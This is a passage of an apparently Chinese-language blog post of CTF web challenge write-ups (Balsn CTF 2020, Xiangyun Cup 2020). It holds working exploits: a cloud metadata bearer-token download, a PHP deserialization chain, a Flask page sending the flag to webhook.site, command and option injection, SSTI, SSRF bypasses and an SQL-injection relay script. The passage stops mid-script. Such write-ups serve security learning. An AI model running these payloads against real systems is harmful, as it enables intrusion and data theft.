/computeMetadata/v1/instance/service-accounts/default/scopes
https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
https://www.googleapis.com/auth/servicecontrol
https://www.googleapis.com/auth/service.management.readonly
https://www.googleapis.com/auth/trace.append
----------------------------------------------------------------------
...</code></pre><p>阅读<a href="https://cloud.google.com/storage/docs" target="_blank" rel="noopener">文档</a>来了解下载存储在服务器上的数据</p>
<pre><code class="shell">#查询存储分区：
curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \
  &quot;https://storage.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc&quot;

#查询存储对象
curl -X GET -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \
  &quot;https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o&quot;

#下载对象：
curl -X GET -o &quot;/tmp/obj1&quot; -H &quot;Authorization: Bearer ya29.c.KpcB5QezRL_BHhcBssfoC6rViLqbqi72L687AYtNLcDVGO2vf__MDx-Z-4X-j1Tk5iXmMZfpUvEpzwlIfl4RctiaZQa_mODL0KI5DqdyMic7E8WBGSi1GB4ViTLf-u8P155FfcteCoA_PVkWRt6phv_W_iFRsooJBLW7aRllZwP9Dx2-G1UVixDww-GUzLRbBN2CqT7HKp1AKA&quot; \
  &quot;https://www.googleapis.com/download/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/containers%2Fimages%2Fsha256:1c2e7c9e95b20a8dde6674890b722779c5a797d9d5968a9fa3a0ef89cd90f9b4?generation=1605158579380048&amp;alt=media&quot;
</code></pre>
<p>将所有对象下载下来后<code>cat * | grep -a flag</code><br>获得flag路径：<code>/opt/workdir/flag-6ba72dc9ffb518f5bcd92eee.txt</code></p>
<p>BALSN{What_permissions_does_the_service_account_need}</p>
<h2 id="L5D"><a href="#L5D" class="headerlink" title="L5D"></a>L5D</h2><p>题目描述</p>
<blockquote>
<p>「Taking L5D was a profound experience, one of the most important things in my life.」</p>
<p>Try this new Unserialize-Oriented Programming System a.k.a. L5D !</p>
<p><a href="http://l5d.balsnctf.com:12345/index.php" target="_blank" rel="noopener">http://l5d.balsnctf.com:12345/index.php</a></p>
<p>PHP Version: 7.0.33</p>
<p>Author: kaibro</p>
</blockquote>
<p>题目提供了源码，阅读后发现以下可能作为关键点的地方：</p>
<p>变量覆盖：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142917.jpg" alt="image6765"></p>
<p>任意命令执行：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116142948.jpg" alt="image6899"></p>
<p>修改全局变量cmd</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201116143051.jpg" alt="image7035"></p>
<p>但是题目给反序列化的数据加上了一个限制：不能出现<code>*</code>(protect变量就需要<code>*</code>号)</p>
<p>实际测试一下发现，并不能用public,private的同名变量来代替protect变量，这是难点一</p>
<p>还有就是其他类的<code>__wakeup</code>方法会禁止我们通过L5D_Upload来任意变量覆盖，然后L5D_Upload又必须在其他的<code>__destruct</code>方法前执行，这是难点二</p>
<p>难点二我们可以通过最后一个调用L5D_Upload的<code>__wakeup</code>，第一个调用它的<code>__destruct</code>来绕过，因为<code>__wakeup</code>的调用顺序是从里到外，从前到后，<code>__destruct</code>的调用顺序是从外到内，从前到后，所以构造</p>
<pre><code class="php">class L5D_Upload{
    public $padding;
    public function __construct()
    {
        $this-&gt;padding = new L5D_ResetCMD();
    }

}
class L5D_ResetCMD {

    public $padding;
    protected $new_cmd = &quot;cat /flag&quot;;
    public function __construct()
    {
        $this-&gt;padding=new L5D_Command();
    }

}
class L5D_Command{
}
new L5D_Upload();</code></pre>
<p>接着就是难点一了，对<code>*</code>号的禁用导致我们不能直接反序列化一个protect属性的成员</p>
<p>但是我们可以用大写S来绕过：</p>
<p>可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
<pre><code>O:12:&quot;L5D_ResetCMD&quot;:2:{s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:{}S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;}</code></pre><p>这样new_cmd就是protect属性了</p>
<p>最后的exp:</p>
<pre><code class="php">class L5D_Upload{
    public $padding;
    public function __construct()
    {
        $this-&gt;padding = new L5D_ResetCMD();
    }

}
class L5D_ResetCMD {

    public $padding;
    protected $new_cmd = &quot;cat /flag&quot;;
    public function __construct()
    {
        $this-&gt;padding=new L5D_Command();
    }

}
class L5D_Command{
}
$a=str_replace(&#39;s:10:&quot;&#39;.&quot;\x00*\x00&quot;,&#39;S:10:&quot;\00\2a\00&#39;,serialize(new L5D_Upload()));
echo urlencode ($a);
</code></pre>
<h2 id="the-woven-web"><a href="#the-woven-web" class="headerlink" title="the woven web"></a>the woven web</h2><p>看了<a href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py" target="_blank" rel="noopener">Super⚔️Blue</a> 的wp，只能说一句牛逼</p>
<p>其实原理很简单：让浏览器自动下载一个文件，然后file协议访问那个文件，那个文件就可以引用server.js，于是就有flag的值了</p>
<p>exp.py</p>
<pre><code class="python">from flask import Flask
app = Flask(__name__)

@app.route(&#39;/index.html&#39;)
def hello_world():
    r = &quot;&quot;&quot;
    &lt;html&gt;
    &lt;head&gt;
        &lt;script&gt;
            function require(a){
                if(a==&quot;express&quot;){return ()=&gt;{return {get:function(){},listen:function(){}}}
                }
                if(a==&quot;redis&quot;){
                    return {createClient:function(){}}
                }
                if(a==&quot;fs&quot;){
                    return {existsSync:function(){}};
                }
            }
        &lt;/script&gt;
        &lt;script src=&quot;../app/server.js&quot;&gt;
        &lt;/script&gt;
        &lt;script&gt;
            fetch(&quot;https://webhook.site/X?a=&quot;+FLAG);
        &lt;/script&gt;
    &lt;/head&gt;
    &lt;/html&gt;
    &quot;&quot;&quot;

    return r,{&quot;Content-Disposition&quot;:&#39;attachment; filename=&quot;wtf22.html&quot;&#39;}

if(__name__==&quot;__main__&quot;):
    app.run(&quot;0.0.0.0&quot;,4000)
</code></pre>
<h2 id="Windows-XP-Media-Player"><a href="#Windows-XP-Media-Player" class="headerlink" title="Windows XP Media Player"></a>Windows XP Media Player</h2><p>还是看了<a href="https://github.com/Super-Guesser/ctf/blob/master/BalsnCTF2020/web/The%20Woven/the_woven_web.py" target="_blank" rel="noopener">Super⚔️Blue</a> 的wp</p>
<p>应该静下心来做的</p>
<pre><code class="python">import requests
import time

host = &quot;windows-xp-media-player.balsnctf.com&quot;


def req(s, path):
    return s.get(&quot;http://{}{}&quot;.format(host, path))


if __name__ == &quot;__main__&quot;:
    s1 = requests.Session()

    # create a session
    resp = req(s1, &quot;/&quot;)

    # use create playlist to generate the command `mkdir -p ./--output=/tmp/vakzz_in` 
    req(s1, &quot;/?args=-p ./--output=/tmp/vakzz_in&amp;op=create&quot;)

    # also create a `-z` folder
    req(s1, &quot;/?args=./-z&amp;op=create&quot;)

    # use `--` so that the remaining args are not treated as options, will run `ls -- -z --output=/tmp/vakzz_in /flag/`
    # since all of these folders exist ls will exit cleanly and add our args to the queue
    req(s1, &quot;/q/add?args=-- -z --output=/tmp/vakzz_in /flag/&quot;)

    # remove the `--` from the queue
    req(s1, &quot;/q/skip&quot;)

    # shuffle the queue which will run `shuf -e -z --output=/tmp/vakzz_in /flag/`
    # this writes final argument as a null terminated string to the specified output file
    req(s1, &quot;/q/shuf&quot;)

    # now /tmp/vakzz_in contains `/flag/\x00`

    # rate limit
    time.sleep(10)

    # new session as need more playlists
    s2 = requests.Session()
    resp = req(s2, &quot;/&quot;)

    # create the folder `--files0-from=/tmp/vakzz_in` for option injection
    req(s2, &quot;/?args=-p ./--files0-from=/tmp/vakzz_in&amp;op=create&quot;)

    # create the folder `--exclude=flag?[1-9]*` for option injection
    req(s2, &quot;/?args=./--exclude=flag?[1-9]*&amp;op=create&quot;)

    # now `--files0-from=/tmp/vakzz_in` and `--exclude=flag?[1-9]*` are both in the names array and can be used in args

    # use stat to run `du` with our injection options, causing it to look at folders from /tmp/vakzz_in and exclude
    # anything that matches the supplied pattern: `du -sh --files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*`
    resp = req(s2, &quot;/?args=--files0-from=/tmp/vakzz_in --exclude=flag?[1-9]*&amp;op=stat&quot;)

    # if the flag was excluded then this will return `8.0K    /flag/` otherwise `16K    /flag/`, letting us know if 
    # the flag starts with 0-9 or a-f.
    print(resp.text.split(&#39;&lt;div class=&quot;field-row&quot;&gt;&lt;label&gt;&#39;)[2].split(&quot; &quot;)[0])</code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化在禁止\x00和*时，我们可以利用大写S来绕过对protected,private等属性的字符检测如：</p>
<pre><code>O:12:&quot;L5D_ResetCMD&quot;:2:{s:7:&quot;padding&quot;;O:11:&quot;L5D_Command&quot;:0:{}S:10:&quot;\00\2a\00new_cmd&quot;;s:9:&quot;cat /flag&quot;;}</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/11/27/2020">https://www.ccreater.top/2020/11/27/2020</a> balsn ctf web 部分题解/](<a href="https://www.ccreater.top/2020/11/27/2020">https://www.ccreater.top/2020/11/27/2020</a> balsn ctf web 部分题解/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.ccreater.top/2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" data-id="ckmn5dcck0001jsni5pwxbriw" data-title="2020 balsn ctf web 部分题解" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020祥云杯web题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2020-11-24T10:30:16.522Z" itemprop="datePublished">2020-11-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/24/2020%E7%A5%A5%E4%BA%91%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">2020祥云杯web题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="祥云杯web题解"><a href="#祥云杯web题解" class="headerlink" title="祥云杯web题解"></a>祥云杯web题解</h1><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>题目源码</p>
<pre><code class="php">&lt;?php
error_reporting(0);
if (isset($_GET[&#39;url&#39;])) {
  $ip=$_GET[&#39;url&#39;];
  if(preg_match(&quot;/(;|&#39;| |&gt;|]|&amp;| |\\$|python|sh|nc|tac|rev|more|tailf|index|php|head|nl|tail|less|cat|ruby|perl|bash|rm|cp|mv|\*|\{)/i&quot;, $ip)){
      die(&quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;
      alert(&#39;no no no!&#39;)
      window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;);
  }else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
      die(&quot;&lt;script language=&#39;javascript&#39; type=&#39;text/javascript&#39;&gt;
      alert(&#39;no flag!&#39;)
      window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;);
  }
  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
}</code></pre>
<p>测试发现过滤了:<code>&#39;,$,&amp;,*,;,&gt;,],{, ,</code><br>利用%09来绕过对空格的过滤</p>
<pre><code>http://eci-2ze5a6nc0glncs99tzta.cloudeci1.ichunqiu.com/?url=-h|`echo%09WTJGMElDOWxkR012TG1acGJtUm1iR0ZuTDJac1lXY3VkSGgw|base64%09-d|base64%09-d`</code></pre><h2 id="flaskbot"><a href="#flaskbot" class="headerlink" title="flaskbot"></a>flaskbot</h2><p>测试一波发现输入点都没有ssti,并且开着报错</p>
<p>我们利用报错来拿源码</p>
<p>最关键的源码<code>render_template_string(guessNum(num,name))</code> 是直接访问不存在界面得到的</p>
<pre><code class="python">@app.route(&#39;/&#39;,methods=[&#39;POST&#39;,&#39;GET&#39;])
def Hello():
    if request.method == &quot;POST&quot;:
        user = request.form[&#39;name&#39;]
        resp = make_response(render_template(&quot;guess.html&quot;,name=user))
        resp.set_cookie(&#39;user&#39;,base64.urlsafe_b64encode(user),max_age=3600)
        return resp
    else:
        user=request.cookies.get(&#39;user&#39;)
        if user == None:
           return render_template(&quot;index.html&quot;)
        else:
            user=user.encode(&#39;utf-8&#39;)
            return render_template(&quot;guess.html&quot;,name=base64.urlsafe_b64decode(user))


@app.route(&#39;/guess&#39;,methods=[&#39;POST&#39;])
def Guess():
    user=request.cookies.get(&#39;user&#39;)

    if user==None:
        return redirect(url_for(&quot;Hello&quot;)
    user=user.encode(&#39;utf-8&#39;)
    name = base64.urlsafe_b64decode(user)
    num = float(request.form[&#39;num&#39;])
    if(num&lt;0):
        return &quot;Too Small&quot;
    elif num&gt;1000000000.0:
        return &quot;Too Large&quot;

    else:
        return render_template_string(guessNum(num,name))#直接提醒我们这里存在ssti注入

@app.errorhandler(404)
def miss(e):
    return &quot;What are you looking for?!!&quot;.getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)), 404

if __name__ == &#39;__main__&#39;:
    f_handler=open(&#39;/var/log/app.log&#39;, &#39;w&#39;)
    sys.stderr=f_handler
    app.run(debug=True, host=&#39;0.0.0.0&#39;,port=8888</code></pre>
<p>看一下回显很容易得知bot利用二分法来猜数据，如果一定次数内bot没猜出来就是我们赢，正常的数据基本是不行的。</p>
<p>我们看下他得到数字的过程:</p>
<pre><code class="python">num = float(request.form[&#39;num&#39;])
    if(num&lt;0):
        return &quot;Too Small&quot;
    elif num&gt;1000000000.0:
        return &quot;Too Large&quot;
</code></pre>
<p>字符串转数值且小于0大于1000000000.0</p>
<p>阅读python文档<a href="https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`" target="_blank" rel="noopener">https://docs.python.org/3.2/library/stdtypes.html#numeric-types-int-float-complex，我们看到一个这样的浮点数:`</a> float also accepts the strings “nan” and “inf” with an optional prefix “+” or “-” for Not a Number (NaN) and positive or negative infinity. `</p>
<p>且nan&lt;0,nan&gt;1000000000.0都为false,这样他的二分法永远猜不到了</p>
<p>然后修改name进行ssti</p>
<pre><code>{{"".__class__.__mro__[2].__subclasses__()[258].__init__.__getattribute__("__globals__")["\\x6f\\x73"].__getattribute__("\\x73ystem")("whoami")}}</code></pre><h2 id="easygogogo"><a href="#easygogogo" class="headerlink" title="easygogogo"></a>easygogogo</h2><p>题目有三个接口，登入，查看上传文件，上传文件</p>
<p>测试上传文件接口发现，可以直接路径穿越</p>
<p>测试查看上传文件接口发现，可以任意文件读取，但是你得有cookie(通过文件上传生成)</p>
<p>/proc/self/cmdline</p>
<pre><code>HOSTNAME=engine-1 HOME=/root OLDPWD=/root TERM=xterm PATH=/go/bin:/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOPATH=/go PWD=/go GOLANG_VERSION=1.15.5</code></pre><p>刚开始去读/etc/passwd发现，啥都没有，但是读/proc/self/cmdline就有东西，然后猜测了下这是root权限启动的</p>
<p>由于重启docker环境并不是让cookie的salt发生改变，所以，如果用之前生成好的cookie(如果是root权限/etc/passwd被覆盖)去获得新docker的/etc/passwd有内容的话就说明是root权限，没有的话就是其他原因</p>
<p>。。。。。</p>
<p>真的是root权限！！！！！</p>
<p>直接读取/root/start.sh</p>
<pre><code class="bash">flagfile=/flag
if [ ${ICQ_FLAG} ];then
    if [ &quot;$flagfile&quot;x = &quot;/flagx&quot; ];then
        echo ${ICQ_FLAG} &gt; ${flagfile}
        chmod 755 ${flagfile}
    else
        #sed -i &quot;s/flag{x*}/${ICQ_FLAG}/&quot; $flagfile
        sed -i -r &quot;s/flag\{.*\}/${ICQ_FLAG}/&quot; $flagfile
        #mysql -uroot -proot nXXXX &lt; $flagfile
    fi
    echo [+] sed flag OK
    unset ICQ_FLAG
else
    echo [!] no ICQ_FLAG
fi

service cron start&amp;&amp;whoami&amp;&amp;cd /go&amp;&amp;go run src/main.go src/functions.go src/model.go src/routes.go</code></pre>
<p>再去读取/flag，顺便读了下源码：</p>
<p>main.go</p>
<pre><code class="go">package main

import (
    &quot;log&quot;
    &quot;net/http&quot;
)
func main() {
    http.Handle(&quot;/uploads/&quot;, http.StripPrefix(&quot;/uploads/&quot;, http.FileServer(http.Dir(&quot;uploads/&quot;))))
    http.Handle(&quot;/statics/&quot;, http.StripPrefix(&quot;/statics/&quot;, http.FileServer(http.Dir(&quot;statics/&quot;))))
    http.HandleFunc(&quot;/index&quot;, index)
    http.HandleFunc(&quot;/&quot;, index)
    http.HandleFunc(&quot;/login&quot;, login)
    http.HandleFunc(&quot;/upload&quot;, upload)
    http.HandleFunc(&quot;/show&quot;, show)
    http.HandleFunc(&quot;/home&quot;, home)
    err := http.ListenAndServe(&quot;:80&quot;, nil)
    if err != nil {
        log.Fatal(&quot;ListenAndServe: &quot;, err)
    }
}</code></pre>
<p>src/functions.go</p>
<pre><code class="go">package main

import (
    &quot;bytes&quot;
    &quot;crypto/md5&quot;
    &quot;encoding/base64&quot;
    &quot;encoding/gob&quot;
    &quot;encoding/hex&quot;
    &quot;net/http&quot;
    &quot;os&quot;
    &quot;time&quot;
)

func PathExists(path string) (bool, error) {
    _, err := os.Stat(path)
    if err == nil {
        return true, nil
    }
    if os.IsNotExist(err) {
        return false, nil
    }
    return false, err
}
func fileExist(filename string) bool {
    _, err := os.Stat(filename)
    return err == nil || os.IsExist(err)
}
func Md5(s string) string {
    h := md5.New()
    h.Write([]byte(s))
    return hex.EncodeToString(h.Sum(nil))
}
func getCookie(r *http.Request) interface{}{
    cookie, err := r.Cookie(&quot;cookie&quot;)
    if err==nil{
        return cookie.Value
    }else{
        return nil
    }
}
func setCookie(w http.ResponseWriter,r *http.Request,value string){
    expiration := time.Now()
    expiration = expiration.AddDate(1, 0, 0)
//    fmt.Println(value)
    cookie := http.Cookie{Name: &quot;cookie&quot;, Value: value, Expires: expiration}
    http.SetCookie(w, &amp;cookie)
}
func serialize(instance Users) []byte{
//    fmt.Println(instance.Username)
    var result bytes.Buffer
    encoder := gob.NewEncoder(&amp;result)
    encoder.Encode(instance)
    userBytes := result.Bytes()
//    fmt.Printf(&quot;%s&quot;,userBytes)
    return userBytes
}
func unseralize(data []byte) Users{
    var account Users
    decoder := gob.NewDecoder(bytes.NewReader(data))
    decoder.Decode(&amp;account)
    return account
}

func cookieEncode(data []byte) string{
//    fmt.Printf(&quot;%s&quot;,data)
    return base64.StdEncoding.EncodeToString(data)
}
func cookieDecode(data string) []byte{
    bytesData, _ := base64.StdEncoding.DecodeString(data)
    return bytesData
}</code></pre>
<p>src/model.go</p>
<pre><code class="go">package main

type Users struct{
    Username string
    Password string
    Filename string
    Sign string
}
var salt=&quot;123123adsdasr123sdfkaadls&quot;</code></pre>
<p>src/routes.go</p>
<pre><code class="go">package main

import (
    &quot;encoding/base64&quot;
    &quot;fmt&quot;
    &quot;html/template&quot;
    &quot;io&quot;
    &quot;net/http&quot;
    &quot;os&quot;
    &quot;strings&quot;
)
//Route:upload
func upload(w http.ResponseWriter, r *http.Request) {
    r.Body = http.MaxBytesReader(w, r.Body, 32&lt;&lt;16)
    ip := strings.Split(r.RemoteAddr, &quot;:&quot;)[0]
    if getCookie(r)!=nil{
        UserData:=unseralize(cookieDecode(getCookie(r).(string)))
        if r.Method == &quot;GET&quot; {
            t, _ := template.ParseFiles(&quot;upload.gtpl&quot;)
            t.Execute(w,nil)
        } else {
            path:=&quot;./uploads/&quot;+Md5(ip)
            tmp,_:=PathExists(path)
            if !tmp{
                err:= os.Mkdir(path, os.ModePerm)
                if err!=nil{
                    fmt.Printf(&quot;failed&quot;)
                }
            }
            r.ParseMultipartForm(32 &lt;&lt; 20)
            file, handler, err := r.FormFile(&quot;uploadfile&quot;)
            if err != nil {
                fmt.Println(err)
                return
            }
            defer file.Close()
            f, err := os.OpenFile(&quot;./uploads/&quot;+Md5(ip)+&quot;/&quot;+handler.Filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0777)
            if err != nil {
                fmt.Fprint(w,err)
                return
            }
            defer f.Close()
            io.Copy(f, file)
            UserData.Filename=&quot;./uploads/&quot;+Md5(ip)+&quot;/&quot;+handler.Filename
            UserData.Sign=Md5(UserData.Filename+salt)
            setCookie(w,r,cookieEncode((serialize(UserData))))
            fmt.Fprint(w,UserData)
            fmt.Fprint(w,&quot;上传成功：&quot;+handler.Filename)
            return
        }
    }else{
        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
        return
    }
}

//Route:/index || /
func index(w http.ResponseWriter, r *http.Request) {
    t, _ := template.ParseFiles(&quot;index.gtpl&quot;)
    t.Execute(w,nil)
    return
}

//Route:/login
func login(w http.ResponseWriter, r *http.Request) {
    if r.Method==&quot;POST&quot;{
        r.ParseForm()
        if r.Form[&quot;username&quot;]==nil &amp;&amp; r.Form[&quot;password&quot;]==nil{
            fmt.Fprint(w,&quot;username and password is required&quot;)
            return
        }
        User:=Users{
            Username: r.Form[&quot;username&quot;][0],
            Password: r.Form[&quot;password&quot;][0],
        }
        setCookie(w,r,cookieEncode(serialize(User)))
        fmt.Fprint(w,&quot;&lt;script&gt;window.location.href=&#39;/home&#39;&lt;/script&gt;&quot;)
    }else{
        fmt.Fprint(w,&quot;Method not allowed&quot;)
        return
    }
}
func home(w http.ResponseWriter,r *http.Request){
    if getCookie(r)!=nil {
        t, _ := template.ParseFiles(&quot;home.gtpl&quot;)
        t.Execute(w, nil)
    }else{
        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
        return
    }
}

//Route:/show
func show(w http.ResponseWriter, r *http.Request) {
    if getCookie(r)!=nil {
        UserData:=unseralize(cookieDecode(getCookie(r).(string)))
        file:=UserData.Filename
        sign:=UserData.Sign
        ff, err := os.Open(file)
        defer ff.Close()
        if err!=nil{
            fmt.Println(err)
            t, _ := template.ParseFiles(&quot;show.gtpl&quot;)
            t.Execute(w, template.HTML(&quot;？？？？？&quot;))
            return
        }
        fmt.Println(sign)
        if sign!=Md5(file+salt){
            fmt.Fprint(w,&quot;签名失败&quot;)
            return
        }
        sourcebuffer := make([]byte, 500000)
        n, _ := ff.Read(sourcebuffer)
        filedata := base64.StdEncoding.EncodeToString(sourcebuffer[:n])
        fmt.Println(filedata)
        t, _ := template.ParseFiles(&quot;show.gtpl&quot;)
        t.Execute(w, template.HTML(&quot;&lt;img src=&#39;data:image/jpeg;base64,&quot;+filedata+&quot;&#39;&gt;&quot;))
    }else{
        fmt.Fprint(w,&quot;&lt;script&gt;alert(&#39;Login first my baby&#39;);&lt;/script&gt;&quot;)
        return
    }
}</code></pre>
<p>这样应该是非预期把？</p>
<h2 id="doyouknowssrf"><a href="#doyouknowssrf" class="headerlink" title="doyouknowssrf"></a>doyouknowssrf</h2><pre><code class="php">&lt;?php
// ini_set(&quot;display_errors&quot;, &quot;On&quot;);
// error_reporting(E_ALL | E_STRICT);


function safe_url($url,$safe) {
    $parsed = parse_url($url);
    $validate_ip = true;
    if($parsed[&#39;port&#39;]  &amp;&amp; !in_array($parsed[&#39;port&#39;],array(&#39;80&#39;,&#39;443&#39;))){

        echo &quot;&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;&quot;.PHP_EOL;

        return false;
    }else{
        preg_match(&#39;/^\d+$/&#39;, $parsed[&#39;host&#39;]) &amp;&amp; $parsed[&#39;host&#39;] = long2ip($parsed[&#39;host&#39;]);
        $long = ip2long($parsed[&#39;host&#39;]);
        if($long===false){
            $ip = null;
            if($safe){
                @putenv(&#39;RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1&#39;);
                $ip   = gethostbyname($parsed[&#39;host&#39;]);
                $long = ip2long($ip);
                $long===false &amp;&amp; $ip = null;
                @putenv(&#39;RES_OPTIONS&#39;);
            }
        }else{
            $ip = $parsed[&#39;host&#39;];
        }
        $ip &amp;&amp; $validate_ip = filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
    }

    if(!in_array($parsed[&#39;scheme&#39;],array(&#39;http&#39;,&#39;https&#39;)) || !$validate_ip){
        echo &quot;&lt;b&gt;{$url} 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;&quot;.PHP_EOL;

        return false;
    }else{
        return $url;
    }
}


function curl($url){
    $safe = false;
    if(safe_url($url,$safe)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $co = curl_exec($ch);
        curl_close($ch);
        echo $co;
    }
}

highlight_file(__FILE__);
curl($_GET[&#39;url&#39;]);
</code></pre>
<p>emmm，这题是原题。<a href="https://tyaoo.github.io/2020/08/31/2020-GACTF-web/" target="_blank" rel="noopener">https://tyaoo.github.io/2020/08/31/2020-GACTF-web/</a> ,我是后来才知道的。。。。</p>
<p>绕过端口限制的方法一种是：<code>http://foo@127.0.0.1:6379%20@www.baidu.com/</code></p>
<p>还有一个是：<code>http:/ctf.ccreater.top:5000/</code></p>
<p><code>var_dump(parse_url)</code></p>
<pre><code>array(2) {
  &#39;scheme&#39; =&gt;
  string(4) &quot;http&quot;
  &#39;path&#39; =&gt;
  string(23) &quot;/ctf.ccreater.top:5000/&quot;
}</code></pre><p>然后curl去访问是正常的</p>
<p>接下来按着那个wp走发现flask,继续ssrf，发现redis，原本是wp里面的redis主从复制RCE直接打这题的，但是试了好久都没成功，明明有向我发送数据</p>
<p>redis ssrf还有一种RCE方法是写文件，这一题就是这么干的，因为那个wp我一直没往这方面想</p>
<p>然后去看了写redis发现它的版本是2.x主从复制RCE的那个exp是针对3.x和4.x  ：(</p>
<h2 id="easyzzz"><a href="#easyzzz" class="headerlink" title="easyzzz"></a>easyzzz</h2><p>百度一波网上的cve解出这题</p>
<p>简单说下过程</p>
<p>/plugins/webuploader/js/webconfig.php</p>
<p>拿到后台地址  admin539/</p>
<p><a href="https://xz.aliyun.com/t/7414" target="_blank" rel="noopener">https://xz.aliyun.com/t/7414</a> ，利用前台sql注入修改管理员密码</p>
<p>搭个转发的方便测试</p>
<pre><code class="python">import requests
from flask import Flask,request
app = Flask(__name__)


def access(exp):
    burp0_url = &quot;http://eci-2ze9cofh8j38ebxctduq.cloudeci1.ichunqiu.com:80/plugins/sms/sms_list.php?act=del&quot;
    burp0_cookies = {&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1604567758,1604568322,1604568358,1605921830&quot;, &quot;Hm_lpvt_2d0601bd28de7d49818249cf35d95943&quot;: &quot;1606016268&quot;, &quot;PHPSESSID&quot;: &quot;3fe85864bb4ad1dc9f25e5271281baf9&quot;, &quot;__jsluid_h&quot;: &quot;85077cc270ca34654c02f2479fcb9390&quot;, &quot;zzz254_adminpass&quot;: &quot;0&quot;}
